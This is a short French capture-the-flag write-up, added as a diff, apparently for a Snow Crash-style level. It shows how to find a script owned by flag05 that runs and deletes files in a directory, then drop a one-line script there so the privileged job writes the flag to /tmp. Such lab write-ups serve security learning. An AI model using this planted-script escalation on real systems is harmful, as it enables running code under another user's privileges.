@@ -1,0 +1,12 @@
+avec la commande:
+find / -user flag05 -readable 2> /dev/null
+
+on trouve un fichier qui a les droits de flag05
+/usr/sbin/openarenaserver
+
+le fichier est un script qui execute tout les fichier dans le dossier /opt/openarenaserver/ et qui les supprimes
+
+avec la commande:
+echo 'echo $(getflag) > /tmp/flag' > /opt/openarenaserver/file
+
+on cree un script qui execute getflag et met le flag dans le fichier /tmp/flag
